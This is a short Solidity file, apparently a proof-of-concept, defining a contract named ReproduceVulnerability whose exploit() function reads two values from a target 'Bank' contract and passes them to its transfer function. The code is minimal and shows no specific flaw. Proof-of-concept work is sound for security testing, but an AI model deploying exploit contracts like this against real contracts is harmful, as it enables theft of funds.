contract ReproduceVulnerability {
    Bank public target;

    constructor(address targetAddress) {
        target = Bank(targetAddress);
    }

    function exploit() public {
        uint valueA = target.a();
        uint valueB = target.b();
        target.transfer(valueA, valueB);
    }
}

interface Bank {
    function a() external view returns (uint);
    function b() external view returns (uint);
    function transfer(uint _a, uint _b) external returns (uint);
}